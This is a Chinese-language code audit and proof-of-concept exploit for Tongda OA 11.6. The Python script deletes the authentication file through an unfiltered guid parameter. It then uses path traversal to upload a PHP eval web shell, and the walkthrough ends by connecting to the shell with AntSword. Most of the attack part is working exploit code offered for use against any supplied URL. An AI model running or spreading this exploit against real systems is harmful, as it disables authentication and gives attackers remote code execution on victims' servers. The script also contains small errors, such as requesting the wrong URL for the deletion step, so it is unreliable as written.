# 通达OA 11.6 任意文件 删除漏洞

> 此POC适用于通达OA11.6版本,链接:https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe

## 代码审计

> 此审计建立在POC之上,思路由后往前

### 1. 上传文件

相对地址: ..\webroot\general\data_center\utils\upload.php

> 通达OA文件解密网站: http://dezend.qiling.org/free.html ,下列只贴出关键代码

~~~php
<?php
include_once 'inc/auth.inc.php';	### 用户认证
......
if ($action == 'upload') {		    ### 可构造?$action=upload,以执行下方逻辑代码
    if ($filetype == 'xls') {
       .....
    } else {
        if ($filetype == 'img') {
          .....
        } else {				   ### 构造 $filetype=demo绕过上方xls、img
            $uploaddir = MYOA_ATTACH_PATH . '/data_center/attachment/';
            if (!is_dir(MYOA_ATTACH_PATH . '/data_center/attachment')) {
                if (!is_dir(MYOA_ATTACH_PATH . '/data_center')) {
                    mkdir(MYOA_ATTACH_PATH . '/data_center');
                }
                mkdir(MYOA_ATTACH_PATH . '/data_center/attachment');
            }
            if (isset($from_rep)) {	 ### 此处不传$from_rep,执行下方else
 			......
            } else {
                $s_n = $_FILES['FILE1']['name'];	### 构造$s_n
                if ($s_n[0] != '{') {
                    $s_n = $repkid . '_' . $s_n;	### 构造 $repkid=../../../demo.php即可,目录穿越存储文件
                    				#注意文件名前有 _
                }
                if (move_uploaded_file($_FILES['FILE1']['tmp_name'], $uploaddir . $s_n)) { #上传
                }
            }
        }
    }
    @unlink($_FILES['FILE1']);
......
}

/***
	以上代码逻辑上是可以通过构造来实现,但文件头处
	include_once 'inc/auth.inc.php'; #包含了用户认证模块,POC中把此文件删除,从而绕过认证
***/

~~~

### 2.任意文件删除⭐

> 相对地址:  ..\webroot\module\appbuilder\assets\print.php, 关键代码如下

~~~php
<?php
$s_tmp = __DIR__ . '/../../../../logs/appbuilder/logs';
$s_tmp .= '/' . $_GET['guid'];		# 无任何过滤防御措施,直接对guid获取
if (file_exists($s_tmp)) {
    $arr_data = unserialize(file_get_contents($s_tmp));
    unlink($s_tmp);				   # 直接删除 $s_tmp所指文件
    $s_user = $arr_data['user'];
} else {
    echo '未知参数';
    exit;
}

/**
	直接get构造$guid指向auth.inc.php,即可实现删除的目的
**/
~~~



### 3. POC

~~~markdown
删除语句 http://localhost/module/appbuilder/assets/print.php?guid=../../../inc/auth.inc.php 
~~~

~~~python
#-*- coding:urf-8 -*-
# Author: i4mhmh
# TDOA 11.6
import requests

def poc_index(url):
    unlink_path = str(url) + '/module/appbuilder/assets/print.php?guid=../../../inc/auth.inc.php'
    unlink_auth = requests.get(url, verify=False)   #verify主要是针对https
    # 判断是否删除
    test_unlink = str(url) + '/inc/auth.inc.php'
    unlink_res = requests.get(test_unlink)
    if unlink_res.status_code == 200:
        print('[-] 删除未成功,请检查版本号以及url')
        return False
    elif unlink_res.status_code == 404:
        print('[+] unlink module test pass!')
        pass
    else:
        print('target_status: ' + str(unlink_res.status_code))
        return False
    # 文件上传
    upload_url = str(url) + '/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/../../../'
    file = {'FILE1': ('demo.php', '<?php eval($_POST["demo"]);?>')}
    requests.post(url=upload_url, files=file)
    end_url = str(url) + '/_demo.php'
    if requests.get(end_url).status_code == 200:
        print('[+] POC Pentest Success *TDOA V11.6')
        print('[+] url: '+ url +'/_demo.php key: demo')
    else:
        print('[-] POC未生效,请检查相关参数')
def main():
    url = input('plz input your url (like "http://localhost") :')
    poc_index(url)
main()
~~~

## 过程

1. py poc

![image-20210420113027409](image-20210420113027409.png)

2. 中国蚁剑连接

![image-20210420113213072](image-20210420113213072.png)